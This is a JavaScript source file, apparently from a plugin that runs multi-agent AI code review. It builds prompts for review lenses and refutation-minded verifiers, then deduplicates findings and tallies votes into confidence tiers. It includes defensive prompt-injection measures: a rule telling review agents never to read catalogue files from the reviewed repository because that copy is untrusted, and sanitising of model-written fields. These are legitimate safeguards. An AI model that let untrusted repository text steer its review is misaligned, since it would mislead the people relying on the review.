// CLAUDE_PLUGIN_ROOT, the installed cache for this version — see loggerPrelude) and NEVER resolved
// against the reviewed repository, whose copy would be untrusted text steering the lens. Built at use
// time for the same reason as loggerPreludeNow: CRAFT_VERSION is declared below. Each entry names the
// classes its brief carries inline, which are the fallback when no candidate is readable.
/** @type {Record<string, { label: string, file: string, fallback: string }>} */
const LENS_CATALOGUES = {
  reconciler: { label: 'RACE CATALOGUE', file: 'skills/distributed-races/catalogue.md', fallback: 'R1–R6' },
  compat: { label: 'COMPATIBILITY CATALOGUE', file: 'skills/compatibility/catalogue.md', fallback: 'C1–C4, C8, C9 and C11–C13' },
}
/** @param {string} lens */
function lensCatalogueLine(lens) {
  const cat = Object.prototype.hasOwnProperty.call(LENS_CATALOGUES, lens) ? LENS_CATALOGUES[lens] : undefined
  if (!cat) return ''
  const root = flattenField(craftRootArg)
  const candidates = [
    root ? `${root}/${cat.file}` : '',
    `\${CLAUDE_PLUGIN_ROOT}/${cat.file}`,
    `\${CLAUDE_CONFIG_DIR:-$HOME/.claude}/plugins/cache/craft/craft/${CRAFT_VERSION}/${cat.file}`,
  ].filter(Boolean).map(c => `\`${c}\``)
  return `${cat.label}: read the first of these that exists (expand the variables with Bash): ${candidates.join(', ')}. Never read a copy inside the reviewed repository. None readable → work ${cat.fallback} from the brief above and say the catalogue was unavailable.`
}

/** @param {string} lens @param {string} priorSummary @param {Profile} profile @param {Plan} plan @param {Slice | null} [slice] */
function lensPrompt(lens, priorSummary, profile, plan, slice = null) {
  if (lens === 'negative-space') return negativeSpacePrompt(priorSummary, profile, plan)
  // The pathspec the lens reviews. A slice replaces the profile's globs with its own files — that
  // is the entire mechanism: the agent pulls what it is responsible for instead of the whole diff,
  // and the per-turn re-read it pays for the rest of its life shrinks by the same factor.
  const pathspec = lensPathspec(slice, profile)
  return `You are the **${lens}** review lens for a ${profile.lang} diff. Review ONLY this slice; ignore everything else (other lenses cover it). Load the ${profile.rubricSkill} skill for the rubric${profile.navSkill ? ` and the ${profile.navSkill} skill for context expansion` : ''}.

SLICE: ${profile.lensBrief[lens] || lens}
${lensCatalogueLine(lens)}
${strictMaintainabilityLine(lens)}
Diff base: ${lensBaseLabel()}. Review with \`git diff ${lensDiffRange()} -- ${pathspec}\`.
${sliceBlock(slice)}
${reReviewBlock()}
${lensPlanLines(plan)}

CONTEXT EXPANSION (required): for each finding, trace definitions / uses / consumers of the changed symbols (Grep/Glob${profile.navSkill ? ' + LSP' : ''}) before judging — do not read the diff in isolation. If a finding depends on code outside the diff, say so in \`why\`.
BLAST-RADIUS (required): for each changed PUBLIC surface you touch, note how many consumers are affected and set a breaking-change flag in \`blastRadius\`.
CONFIDENCE: report everything you suspect, located. Do NOT self-censor borderline findings — verification happens downstream. Each finding needs file:line (use file:"" line:0 only when truly not locatable).
WHERE-CHECKED (required field): a finding usually rests on a premise that is NOT visible at the line you cite — "the dependency rejects this", "this is reachable from untrusted input", "no caller guards it", "the sibling path does X". Every such premise must be pinned to a \`file:line\` you ACTUALLY OPENED and read, including inside dependency sources (\`~/.cargo/registry\`, the vendored tree, the flake input) — put them in \`whereChecked\`. An off-site premise you did not open is not admissible: either open it, or drop the claim and report only what the cited line itself shows. Set \`whereChecked\` to "" ONLY when the finding needs no off-site premise at all. Do not restate the cited defect line there — it adds nothing.
RULE ID (required field): set \`ruleId\` to the matching catalog ID from the ${profile.rubricSkill} skill's rules.md when the finding maps to a listed rule; use "" for a novel finding with no catalog rule. Do not force a bad fit.
${mutantsLine(profile, lens, plan)}
ALREADY-FOUND (do not repeat; look for what these MISSED):
${priorSummary}

Return {lens, findings[]}.

Observability: the review workflow records this run — do NOT write your own record.`
}

// `profile` is threaded in for the exclusion catalog: it is per-profile (only the rust rubric ships
// an fp-rules.md today), and naming a file the nix reviewer does not have would send it hunting.
/** @param {Finding} f @param {number} idx @param {boolean} isTool @param {string} gateProvenance @param {Profile} profile */
function verifyPrompt(f, idx, isTool, gateProvenance, profile) {
  // Model-authored fields enter this prompt as context — guard them the same way the adjudicate track
  // does: flatten identifier/locator fields via promptFields (newline is the single-value injection
  // vector; identifier chars are load-bearing for the grep) and markdown-strip the prose (why/source).
  const pf = promptFields(f)
  const src = sanitizeAttack(f['source'])
  const why = sanitizeAttack(f['why'])
  const exclusionCatalog = exclusionCatalogText(profile)
  const head = verifyHead(isTool, idx, src)
  const at = `${pf.file || '?'}:${f['line'] || 0}`
  return `${head}

FINDING: [${pf.severity}] ${pf.title}
  at ${at}
  why: ${why}
  source: ${src}${f['ruleId'] ? ` · rule ${pf.ruleId}` : ''}
  off-site evidence claimed: ${f['whereChecked'] ? pf.whereChecked : '(none — the finding claims to be self-contained at the cited line)'}

MECHANICAL CHECK FIRST: if a tool can decide this finding (a clippy lint, statix/deadnix rule, semgrep rule, cargo-audit advisory — infer from source/ruleId/title), RUN it scoped to the cited file; its output overrides your judgement in BOTH directions: tool still reports it → refuted=false; tool demonstrably no longer reports it → refuted=true (quote the output in reason).${gateProvenance ? ` The gate invoked the tools as: "${flattenField(gateProvenance)}" — if a tool is not on PATH, reproduce the gate's invocation (e.g. \`nix run nixpkgs#<tool> --\`) before declaring it unrunnable.` : ''}${isTool ? ' If you STILL cannot run the tool, set refuted=false — an unverifiable tool finding stays alive.' : ' If no tool applies, judge it yourself.'}

REFUTATION RULE: refuted=true means the finding's TECHNICAL CLAIM is false — the cited code does not contain the claimed defect, or the deciding tool demonstrably no longer reports it. Context is NOT refutation: that the code is test/fixture/example-only, looks intentional, is unlikely to be built or run, or has low impact NEVER justifies refuted=true. Record that context in reachable=false and reason instead — severity is calibrated downstream.

${exclusionCatalog}Open the cited file and check:
1. citedLineMatches: does ${at} actually contain what the finding claims? (If the citation is wrong/hallucinated → citedLineMatches=false.)
2. reachable: is this code reachable in production, or is it test/example/fixture-only code? (Test-only → reachable=false. This does NOT refute the finding — it only calibrates severity downstream.) REACHABILITY IS ABOUT THE ROUTE, not just the destination: if the claim is "reachable from untrusted input", check that the ROUTE runs from the real entry point — the parser, the handler, the deserializer, the public API — on attacker-supplied data. Reaching the state by CONSTRUCTING the object directly (a builder, \`new\`, a test fixture, an internal constructor) bypasses exactly the validation the question is about, and proves nothing about untrusted-input reachability. That trap catches careful reviewers, so check it explicitly rather than assuming the route was the obvious one.
3. refuted: is the technical claim itself false? (${isTool ? 'Tool-decided as above.' : 'Mechanical check first, then your judgement; when uncertain about the claim, refuted=true.'})
4. premiseSupported: identify the finding's LOAD-BEARING premise — the one claim that, if false, makes the finding evaporate. If it lives outside the cited line (the dependency behaves this way, this is reachable from untrusted input, no caller guards it, the sibling does X), OPEN the \`whereChecked\` location and check it actually shows that. premiseSupported=false when the premise is off-site and \`whereChecked\` is empty, points somewhere that does not show it, or merely restates the cited line. premiseSupported=true when the finding is genuinely self-contained at the cited line, or the off-site evidence checks out. Do NOT set refuted=true just because a premise is uncited — unsupported is not disproven; that is what this field is for, and it demotes the finding downstream instead of killing it.

Return {refuted, citedLineMatches, reachable, premiseSupported, reason}.`
}

/** The exclusion-catalog paragraph of a verify prompt, empty for a profile without one. @param {Profile} profile */
function exclusionCatalogText(profile) {
  return profile?.fpRules
    ? `\nEXCLUSION CATALOG: your rejection is itself a claim and carries the same burden of proof as the finding. Load the ${profile.rubricSkill} skill's ${profile.fpRules} and, when one of its precedents fires, name the ID in \`reason\` (e.g. "refuted per FP-006: proven-Some unwrap"). Run the TRACE each rule demands — "looks guarded" does not fire the invariant-protected rule; following the invariant to its source and showing it dominates the sink on every path does. Two of them (FP-002 operator-controlled input, FP-005 operator-only panic surface) are severity DOWNGRADES, not refutations: the claim still holds, only the attacker's access is missing — say so in \`reason\` and leave refuted=false. The file also lists the KEEP-* non-reasons, dismissals that sound decisive and have repeatedly killed real defects (soundness in a public API no current caller reaches, a logic bug in safe Rust, a panic unwinding through an unsafe region). If nothing in the catalog fits, judge on the merits — never force a bad fit to justify a drop.\n`
    : ''
}

/** @param {boolean} isTool @param {number} idx @param {string} src */
function verifyHead(isTool, idx, src) {
  return isTool
    ? `You are verifier #${idx + 1} for a TOOL-REPORTED code review finding (source: ${src}). Deterministic tool output outranks your judgement — you may refute it ONLY by re-running the tool, never on reasoning alone.`
    : `You are skeptic #${idx + 1} trying to REFUTE a code review finding. Default to refuted=true when uncertain whether the technical claim holds — only let real findings through.`
}

// Cross-lens dedup BEFORE verification. key() above is exact (file:line:title), so two lenses
// wording the same defect differently both enter the pool — and each duplicate would buy its own
// verifier fan-out. A cheap grouping pass merges same-defect findings first; synthesis keeps its
// own dedup instruction as a safety net.
/** @type {Schema<DedupAnswer>} */
const DEDUP_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['groups'],
  properties: {
    groups: {
      type: 'array',
      items: { type: 'array', items: { type: 'integer' } },
      description: 'each inner array = indices of findings that describe the SAME underlying defect; singletons omitted; empty if all distinct',
    },
  },
}
// Mechanical roll-up of high-volume, low-value rule IDs. The api-idioms lens brief already ASKS for
// this ("do NOT file one finding per occurrence — roll repeated instances into ONE finding"), and the
// run store shows it is not obeyed: one lens produced 126 confirmed findings over 21 runs, 100 of
// them Low/Info. An instruction the model can quietly skip is not a cap; this is. The excess is
// folded into the representative finding rather than dropped, and the count is stated in the title
// and logged — a silent truncation would read as "there were only N", which is worse than the flood.
const ROLLUP_MAX = 3
/** @param {Finding[]} pool @param {Profile} profile */
function rollupPool(pool, profile) {
  const ids = profile.rollupRuleIds || []
  if (!ids.length) return pool
  const { groups, out } = rollupGroups(pool, ids)
  for (const [, g] of groups) out.push(...rolledUp(g, profile))
  return out
}

/**
 * The pool split into findings a roll-up rule names, grouped by lens and rule, and the rest in order.
 * @param {Finding[]} pool @param {string[]} ids @returns {{ groups: Map<string, Finding[]>, out: Finding[] }}
 */
function rollupGroups(pool, ids) {
  /** @type {Map<string, Finding[]>} */
  const groups = new Map()
  const out = []
  for (const f of pool) {
    const id = f['ruleId'] || ''
    if (!ids.includes(id)) { out.push(f); continue }
    const k = `${f['source'] || ''}::${id}`
    let g = groups.get(k)
    if (!g) { g = []; groups.set(k, g) }
    g.push(f)
  }
  return { groups, out }
}

/** A finding's severity rank, unknown severities last. @param {Finding} f */
function sevRankOf(f) {
  return SEV_RANK[f['severity'] ?? ''] ?? 9
}

/** One roll-up group as it enters the pool: as is up to ROLLUP_MAX, else the worst ROLLUP_MAX and one folded finding. @param {Finding[]} g @param {Profile} profile @returns {Finding[]} */
function rolledUp(g, profile) {
  // Order by severity so the representative is the worst instance, not an arbitrary one.
  const sorted = g.slice().sort((/** @type {Finding} */ a, /** @type {Finding} */ b) => sevRankOf(a) - sevRankOf(b))
  if (sorted.length <= ROLLUP_MAX) return sorted
  const keep = sorted.slice(0, ROLLUP_MAX)
  const folded = sorted.slice(ROLLUP_MAX)
  const rep = /** @type {Finding} */ (folded[0])   // folded is non-empty: sorted.length > ROLLUP_MAX
  const where = folded.slice(0, 6).map((/** @type {Finding} */ f) => `${f['file'] || '?'}:${f['line'] || 0}`).join(', ')
  const rolled = [...keep, {
    ...rep,
    title: `${rep.title} — and ${folded.length - 1} more of the same (${rep.ruleId})`,
    why: `${rep.why} Repeated ${folded.length} more times across the diff (${where}${folded.length > 6 ? ', …' : ''}); rolled into one finding because per-occurrence reporting of this rule buries the rest of the review. Fix the pattern, not the instance.`,
  }]
  log(`[${profile.id}] Roll-up: ${g.length}× ${rep.ruleId} from '${rep.source}' → ${keep.length} individual + 1 grouped`)
  return rolled
}

// Two findings at the SAME file:line whose titles are near-identical are one defect, and the model
// dedup pass is measurably bad at saying so: it runs on haiku with a 160-char slice of `why`, and its
// own "same file+line alone is NOT enough / when in doubt do NOT group" instruction biases it toward
// keeping both. Measured on a payments-service run: the 'reconciler' and 'errors' lenses filed the same
// reconcile-alarm defect at one line with titles sharing their first 76 characters, survived dedup as
// two findings, and each paid a full 4-vote individual verification. Catch that deterministically — the
// model pass then only has to handle the genuinely reworded cross-file duplicates it is good at.
const SAME_SPOT_OVERLAP = 0.6
/** @param {Finding[]} pool */
function sameSpotGroups(pool) {
  /** @type {Map<string, number[]>} */
  const bySpot = new Map()
  pool.forEach((/** @type {Finding} */ f, /** @type {number} */ i) => {
    if (!f || !f['file']) return // no location → nothing to key on; leave it to the model pass
    const k = `${String(f['file']).toLowerCase()}:${f['line'] || 0}`
    const at = bySpot.get(k)
    if (at) at.push(i)
    else bySpot.set(k, [i])
  })
  const groups = []
  for (const [, idxs] of bySpot) {
    if (idxs.length < 2) continue
    groups.push(...spotGroups(pool, idxs))
  }
  return groups
}

/** Near-identical titles among the findings at one spot, grouped (first match takes a finding). @param {Finding[]} pool @param {number[]} idxs */
function spotGroups(pool, idxs) {
  const groups = []
  /** @type {Set<number>} */
  const taken = new Set()
  for (const i of idxs) {
    if (taken.has(i)) continue
    const g = [i, ...sameTitleAt(pool, idxs, i, taken)]
    if (g.length > 1) { taken.add(i); groups.push(g) }
  }
  return groups
}

/** The not-yet-taken findings at the spot whose title matches finding i's; each one returned is marked taken. @param {Finding[]} pool @param {number[]} idxs @param {number} i @param {Set<number>} taken */
function sameTitleAt(pool, idxs, i, taken) {
  const g = []
  for (const j of idxs) {
    if (j === i || taken.has(j)) continue
    if (shingleOverlap(/** @type {Finding} */ (pool[i])['title'], /** @type {Finding} */ (pool[j])['title']) >= SAME_SPOT_OVERLAP) { g.push(j); taken.add(j) }
  }
  return g
}

/** The model's same-defect groups over the listed pool, or null when the pass failed (logged). @param {Profile} profile @param {string} listing */
async function dedupModelGroups(profile, listing) {
  let res = null
  try {
    res = await ragent(
      `You are deduplicating code-review findings BEFORE verification. Different lenses word the same defect differently. Group ONLY findings that describe the SAME underlying defect — same root cause, where one edit fixes all of them (e.g. one redundant loop reported by both a performance and an idioms lens). Same file+line alone is NOT enough: two distinct defects can share a line. When in doubt, do NOT group.

FINDINGS:
${listing}

Return {groups: [[i, j, ...], ...]} — index groups of same-defect findings; omit singletons; {groups: []} if all are distinct.`,
      { label: `dedup:${profile.id}`, phase: 'Verify', schema: DEDUP_SCHEMA, model: 'haiku', effort: 'low' },
    )
  } catch (e) {
    log(`[${profile.id}] dedup pass failed (${String((e && /** @type {{ message?: unknown }} */ (e).message) || e).slice(0, 80)}) — verifying the raw pool`)
  }
  return res
}

/** One same-defect group merged onto its strictest member. @param {Finding[]} members @param {(f: Finding) => boolean} isToolSrc @returns {Finding} */
function mergedGroup(members, isToolSrc) {
  // Base = the strictest member: tool-sourced first (a tool finding can only be refuted by
  // re-running the tool), then highest severity.
  const base = /** @type {Finding} */ (members.slice().sort((a, b) => (/** @type {number} */ (/** @type {unknown} */ (isToolSrc(b))) - /** @type {number} */ (/** @type {unknown} */ (isToolSrc(a)))) || ((SEV_RANK[a['severity'] ?? ''] ?? 9) - (SEV_RANK[b['severity'] ?? ''] ?? 9)))[0])
  const others = members.filter(m => m !== base)
  // Carry ALL contributing sources so a downstream source-keyed rule (strict maintainability
  // escalation) still fires when its trigger lens was merged into a different-source base.
  const sources = [...new Set(members.map(m => m['source']).filter(Boolean))]
  // Union the off-site evidence too: a merged-away member may have pinned the premise the base
  // only asserted, and dropping it would cost the group its Confirmed tier at verification.
  const whereChecked = [...new Set(members.map(m => m['whereChecked']).filter(Boolean))].join('; ')
  return { ...base, sources, whereChecked, why: `${base['why']} (same defect also reported by: ${others.map(m => m['source']).join(', ')})` }
}

/** @param {Finding[]} pool @param {Profile} profile */
async function dedupPool(pool, profile) {
  if (pool.length < 2) return pool
  const isToolSrc = (/** @type {Finding} */ f) => isToolSource(profile, f['source'])
  const listing = pool.map((/** @type {Finding} */ f, /** @type {number} */ i) => `${i}. ${f['file'] || '?'}:${f['line'] || 0} [${f['severity']}] (${f['source']}) ${f['title']} — ${String(f['why'] || '').slice(0, 160)}`).join('\n')
  const res = await dedupModelGroups(profile, listing)
  // Deterministic same-spot groups go FIRST: the "overlapping groups: first wins" rule below then
  // makes them authoritative over a model group that would have split the same indices differently.
  const detGroups = sameSpotGroups(pool)
  const groups = detGroups.concat(
    (res?.groups ?? []).filter(g => Array.isArray(g) && g.length > 1 && g.every(i => Number.isInteger(i) && i >= 0 && i < pool.length)),
  )
  /** @type {Finding[]} */
  const merged = []
  /** @type {Set<number>} */
  const inGroup = new Set()
  for (const g of groups) {
    if (g.some(i => inGroup.has(i))) continue // overlapping groups: first wins
    for (const i of g) inGroup.add(i)
    merged.push(mergedGroup(g.map((/** @type {number} */ i) => /** @type {Finding} */ (pool[i])), isToolSrc))
  }
  if (!merged.length) return pool
  const out = pool.filter((/** @type {Finding} */ _f, /** @type {number} */ i) => !inGroup.has(i)).concat(merged)
  const detFolded = detGroups.reduce((n, g) => n + g.length - 1, 0)
  log(`[${profile.id}] Dedup before verify: ${pool.length} → ${out.length} (${pool.length - out.length} cross-lens duplicate(s) merged — ${detFolded} of them same-spot, caught deterministically)`)
  return out
}

// Verify a pool of findings → {confirmed, suspected, dropped, refuted}. Rigor scales with the profile's plan.
// Staged verification: cull votes run on a cheap model (sonnet); a High/Critical additionally gets exactly
// ONE authoritative opus vote, so the cheap model can neither confirm nor drop a high-stakes finding alone.
const CULL_MODEL = 'sonnet'

// ---- verification dispatch bounding ----
// Pure helpers, tested as a real module in lib/review-waves.mjs and pasted back here by the
// craft-inline gate, because this script cannot be imported (top-level export + await + return).
// >>> craft-inline lib/review-waves.mjs VERIFY_WINDOW_AGENTS verifyWeight weightedWindow
const VERIFY_WINDOW_AGENTS = 24

/**
 * @param {{severity?: string}} f
 * @param {{verifyVotes?: unknown} | null | undefined} plan
 * @returns {number}
 */
function verifyWeight(f, plan) {
  const isHigh = f.severity === 'Critical' || f.severity === 'High'
  return isHigh ? 1 + Math.max(1, Number(plan?.verifyVotes) || 1) : 1
}

/**
 * @template R, T
 * @param {{run: R, weight?: unknown}[]} entries
 * @param {unknown} maxWeight
 * @param {(run: R, i: number) => T | PromiseLike<T>} runOne `run` is the entry's own (a workflow thunk, in the engine)
 * @returns {Promise<(T | null)[]>}
 */
async function weightedWindow(entries, maxWeight, runOne) {
  const cap = Math.max(1, Number(maxWeight) || 1)
  const out = /** @type {(T | null)[]} */ (new Array(entries.length).fill(null))
  let next = 0
  let inflight = 0
  await /** @type {Promise<void>} */ (new Promise(resolve => {
    const pump = () => {
      while (next < entries.length) {
        const w = Math.max(1, Number(/** @type {{weight?: unknown}} */ (entries[next]).weight) || 1)
        if (inflight > 0 && inflight + w > cap) break
        const i = next++
        inflight += w
        Promise.resolve()
          .then(() => runOne(/** @type {{run: R}} */ (entries[i]).run, i))
          .then(v => { out[i] = v ?? null }, () => { out[i] = null })
          .then(() => { inflight -= w; pump() })
      }
      if (next >= entries.length && inflight === 0) resolve()
    }
    pump()
  }))
  return out
}
// <<< craft-inline

// ---- verification budget ----
// Verification is ~2/3 of a review's entire cost and scales linearly with finding count, uncapped:
// one measured run spent 154 agents / 21MB of transcript on 111 findings. Route each finding to the
// cheapest treatment that cannot change its outcome.
//
// INDIVIDUAL — Critical/High, plus any severity carrying a rule from a family that blocks on sight.
// These decide the verdict and get the full adversarial panel, never batched, never skipped.
// BATCHED — Medium. Can only reach Warning, so one agent judges a group of them instead of one each.
// SKIPPED — Low/Info. No combination of verdicts on these can move Approve/Warning/Block, so no
// verifier is spent on them. They then carry the `unverified` tier and say so in the report: an
// unexamined finding is neither confirmed nor suspected, and it is excluded from the verification
// counters, because a denominator that includes what was never checked makes the refutation rate of
// one run incomparable with another's. The residual risk is a lens UNDER-calling
// severity, which the blocking-family escape hatch below covers for the families where it would hurt.
// The escape hatch belongs ONLY on the skipped tier. Batching is still verification — a Medium the
// lens under-called gets a real adversarial judgement either way — so the only place an under-call
// goes unexamined is `skip`. A first attempt keyed on the whole SAF/ERR/CON *families* dragged most
// of a Rust review back into individual treatment (measured: 88 of 137 agents, 49% of transcript
// volume, wiping out the saving) because those families cover unwrap, dropped errors and every
// concurrency rule. Key it on the specific CRITICAL-tier rules instead, and only when the lens
// filed them at Low/Info — that combination *is* the under-call, and it is rare.
const CRITICAL_TIER_RULES = new Set(['SAF-001', 'SAF-002', 'SAF-003', 'SAF-004', 'SAF-005', 'SAF-006', 'SAF-008', 'ERR-001', 'ERR-002'])
const BATCH_SIZE = 6
/** @param {Finding} f */
function verifyTier(f) {
  if (f['severity'] === 'Critical' || f['severity'] === 'High') return 'individual'
  if (f['severity'] === 'Medium') return 'batch'
  // Low/Info: skipped, unless the rule it cites is one that blocks on sight — then the severity is
  // more likely a mislabel than a judgement, and it is worth one verifier to find out.
  return CRITICAL_TIER_RULES.has(f['ruleId'] || '') ? 'individual' : 'skip'
}
// ---- the same reasoning, carried to the tier where the money is ----
// `verifyTier` skips Low/Info because no judgement on them can move the verdict. That is a statement
// about `reviewVerdict`, not about severity — and once a Critical or High is CONFIRMED the verdict is
// Block, at which point every Medium is verdict-neutral too. Medium is the whole batched population.
// Pure helpers, tested as a real module in lib/verify-economy.mjs and pasted back here by the
// craft-inline gate; the order discipline that makes this legitimate lives there.
// >>> craft-inline lib/verify-economy.mjs BLOCKING_SEVERITIES securesBlock makeVerdictFloor verdictNeutralNow floorSkipReason
/** @type {readonly (string | undefined)[]} */
const BLOCKING_SEVERITIES = ['Critical', 'High']

/**
 * @typedef {{ tier?: string, severity?: string, title?: string, file?: string, line?: number }} JudgedFinding
 * @typedef {{ record: (f: JudgedFinding | null | undefined) => boolean, secured: () => boolean, securedBy: () => JudgedFinding | null }} VerdictFloor
 */
/** @param {JudgedFinding | null | undefined} f */
function securesBlock(f) {
  return !!f && f.tier === 'confirmed' && BLOCKING_SEVERITIES.includes(f.severity)
}

/** @returns {VerdictFloor} */
function makeVerdictFloor() {
  /** @type {JudgedFinding | null} */
  let by = null
  return {
    record(f) {
      if (by !== null || !securesBlock(f)) return false
      by = /** @type {JudgedFinding} */ (f)
      return true
    },
    secured() {
      return by !== null
    },
    securedBy() {
      return by
    },
  }
}

/**
 * @param {JudgedFinding | null | undefined} f
 * @param {VerdictFloor | null | undefined} floor
 */
function verdictNeutralNow(f, floor) {
  return !!f && f.severity === 'Medium' && !!floor && floor.secured()
}

/** @param {VerdictFloor | null | undefined} floor */
function floorSkipReason(floor) {
  const by = floor && floor.securedBy()
  const where = by ? `${by.severity} "${by.title || '?'}" at ${by.file || '?'}:${by.line || 0}` : 'a confirmed blocking finding'
  return `no verifier was spent on it — the verdict was already fixed at Block by the confirmed ${where}, and no judgement on a Medium can move Block either way, so nothing here has been checked against the code`
}
// <<< craft-inline
// ---- the ONE route every death on the verification path takes -------------------------------
// The invariant, stated once: NO death on the verification path may give a finding a tier that
// asserts an inspection, may leave it inside the refutation denominator, or may leave it out of
// `notRun`. The deaths are enumerated rather than discovered one at a time, because the previous
// round of this fix closed the `.catch` branch alone and the dominant death is not a throw:
//   1. the verifier THREW            (both `ragent` attempts rejected, or the budget throw)
//   2. `ragent` returned `null`      (API error / skip, after its one re-dispatch)
//   3. `ragent` returned `null`      (per-agent deadline hit — DEADLINE_HIT, same shape)
//   4. a live answer with NO verdicts (`{verdicts: []}` — nothing was judged)
//   5. a live answer that is not a verdict list at all (schema drift)
//   6. `null` lost by the sliding window (`weightedWindow` writes null for a rejected entry)
//   7. every vote of an individual panel dead (tierFromVotes with an empty vote list)
//   8. a LIVE individual vote that is not a verdict at all (schema drift on the individual path —
//      the ninth door: it does not merely mislabel the finding, it DELETES it, because every absent
//      boolean reads as `false` and `citedLineMatches:false` alone means `refuted`)
// The distinction that MUST survive: "the agent never answered" (any of the above → not verified)
// versus "the agent answered but said nothing about THIS finding" (a lost finding → it was part of
// an inspection, so it keeps `suspected`). The discriminator is exactly this: a null/empty/malformed
// answer is a dead agent; a non-empty verdict list missing one index is a lost finding.
/** @type {(f: Finding, why: string) => Finding} */
const NOT_VERIFIED = (f, why) => ({ ...f, tier: 'unverified', why: `${f['why']} (NOT VERIFIED: ${why})` })
// THE DEATH CLASS of a batch answer, or null when the verifier really did judge something. The
// three classes are kept APART rather than collapsed into one boolean: they are three distinct ways
// the answer can fail to arrive, and a single message for all of them makes a test that scripts one
// of them pass while the other two are unreached — the "neighbouring door" failure the death table
// below exists to prevent. Each class names itself in the finding's `why`, so a row of that table
// proves which branch it reached.
/** @param {unknown} res  the batch verifier's answer, which may be off-schema (see VOTE_AXES) */
function batchDeath(res) {
  if (!res) return 'returned nothing at all — a dead agent, an exhausted retry, or an expired deadline'
  const verdicts = /** @type {{ verdicts?: unknown }} */ (res).verdicts
  if (!Array.isArray(verdicts)) return 'answered OFF-SCHEMA — its answer carried no verdict list at all'
  if (!/** @type {unknown[]} */ (verdicts).length) return 'answered with an EMPTY verdict list — it judged nothing'
  return null
}
// A vote is a JUDGEMENT only if it carries the four booleans tierFromVotes decides on. THE NINTH
// DOOR: the agent wrapper returns ANY non-null value verbatim, so an off-schema object reaches the
// vote arithmetic, where every missing boolean reads as `false` — `citedLineMatches` false alone
// makes the tier `refuted`, and a refuted finding is FILTERED OUT of the run. That is strictly worse
// than every other death on this path: the others keep the finding, this one deletes it — out of
// confirmed, out of suspected, out of unverified, still inside the refutation denominator, and
// absent from `notRun`. The batch path had this guard (batchDeath, ex-verifierAnswered); the
// individual path had none, so schema drift on a Critical silently became a refutation.
/** @type {Array<'refuted' | 'citedLineMatches' | 'reachable' | 'premiseSupported'>} */
const VOTE_AXES = ['refuted', 'citedLineMatches', 'reachable', 'premiseSupported']
/** @param {unknown} v  a verifier's answer, typed or not: the schema is not trusted here @returns {v is Vote} */
function isVerdictShaped(v) {
  return !!v && typeof v === 'object' && VOTE_AXES.every(k => typeof (/** @type {Record<string, unknown>} */ (v))[k] === 'boolean')
}
// Do two verdicts say the same thing on every axis tierFromVotes reads? Only then can the opening
// pair stand in for the full panel — a disagreement on ANY axis (not just `refuted`) can move the
// tier, because citedLineMatches gates refutation outright and reachable/premiseSupported demote.
/** @param {Vote | null | undefined} a @param {Vote | null | undefined} b */
function votesAgree(a, b) {
  // An off-schema vote is not agreement either: two of them would `Boolean(undefined)`-match on every
  // axis and short-circuit the panel on garbage.
  if (!isVerdictShaped(a) || !isVerdictShaped(b)) return false
  return VOTE_AXES.every(k => a[k] === b[k])
}
// The majority arithmetic itself, over the SHAPED votes `v` (`live` is only needed to tell an
// all-dead panel from an all-off-schema one). `tierFromVotes` below is the entry point.
/** @param {Finding} f @param {unknown[]} live @param {Vote[]} v @returns {Finding} */
function decideTier(f, live, v) {
  // EVERY vote died. This is not a judgement and must never be rendered as one: `suspected` is
  // defined in the report as "a verifier looked and the claim did not stand up", so handing it to a
  // finding nothing looked at asserts an inspection that never happened — and, worse, keeps the
  // finding inside the refute denominator and OUT of `notRun`, so a dead panel silently demotes a
  // Critical to a non-gating finding and the verdict does not read as incomplete.
  // One route for every death (see NOT_VERIFIED / verifyDeath): unverified tier, out of the
  // denominator, into notRun.
  if (!v.length) {
    return NOT_VERIFIED(f, live.length
      ? 'the verifier ANSWERED OFF-SCHEMA — its verdict carried none of the judgements this tier is decided on, so nothing was checked against the code'
      : 'every verifier vote for this finding died before returning a verdict — nothing was checked against the code')
  }
  const { tier, premiseOk, reach } = votePanel(v)
  if (tier === 'confirmed' && !premiseOk) return premiseDemoted(f)
  if (tier === 'confirmed' && !reach) return reachDemoted(f, tier)
  return { ...f, tier }
}

/** What a panel of shaped votes decides: the tier by majority, and whether the premise and the reach held. @param {Vote[]} v */
function votePanel(v) {
  const half = v.length / 2
  const lineOk = v.filter((/** @type {Vote} */ x) => x['citedLineMatches']).length >= Math.ceil(half)
  const reach = v.filter((/** @type {Vote} */ x) => x['reachable']).length >= Math.ceil(half)
  const premiseOk = v.filter((/** @type {Vote} */ x) => x['premiseSupported']).length >= Math.ceil(half)
  const refutes = v.filter((/** @type {Vote} */ x) => x['refuted']).length
  let tier
  if (!lineOk) tier = 'refuted'
  else if (refutes > half) tier = 'refuted'
  else if (refutes === 0) tier = 'confirmed'
  else tier = 'suspected'
  return { tier, premiseOk, reach }
}

/** A confirmed finding whose off-site premise no verifier pinned: Suspected. @param {Finding} f @returns {Finding} */
function premiseDemoted(f) {
  return { ...f, tier: 'suspected', why: `${f['why']} (demoted to Suspected: the load-bearing premise is off-site and no verifier could pin it to real code${f['whereChecked'] ? ` — claimed at ${f['whereChecked']}` : ', and whereChecked was empty'})` }
}

/** A confirmed finding off every production-reachable path: one severity lower. @param {Finding} f @param {string} tier @returns {Finding} */
function reachDemoted(f, tier) {
  const demoted = DEMOTE[f['severity'] ?? ''] || f['severity']
  // `demoted` is undefined only when `f` carries no severity, which `...f` already says.
  return { ...f, tier, ...(demoted === undefined ? {} : { severity: demoted }), why: `${f['why']} (severity demoted ${f['severity']}→${demoted}: not on a production-reachable path)` }
}
// Shared vote→tier decision, so the batched path cannot drift from the individual one.
//
// DISCARDING A VOTE IS ITSELF A DEGRADATION, AND IT MUST BE VISIBLE. Dropping an off-schema vote
// before the arithmetic is strictly better than reading its absent booleans as `false` (that deleted
// the finding outright — see the NINTH DOOR above), but as long as ONE shaped vote survived the
// discard was recorded nowhere: not on the finding, not in the counters, not in `notRun`. The shape
// that makes it matter is the opening pair: a Critical opens with one cheap cull plus the
// authoritative vote, `votesAgree` refuses an off-schema partner, and the escalation then buys
// `n1 - 1` further culls — which is ZERO at `verifyVotes: 1`. So the authoritative voice answering
// off-schema leaves the Critical decided by a single cheap vote, rendered exactly like a unanimous
// panel. The thinning is annotated on the finding (what a reader of the verdict sees) and counted in
// the run record as `verification.thinned` (what ranks across runs — a panel that keeps half-dying
// is fragility, and fragility is only legible as a repeat).
/** @param {Finding} f @param {Array<Vote | null | undefined>} votes @returns {Finding} */
function tierFromVotes(f, votes) {
  const live = votes.filter(Boolean)
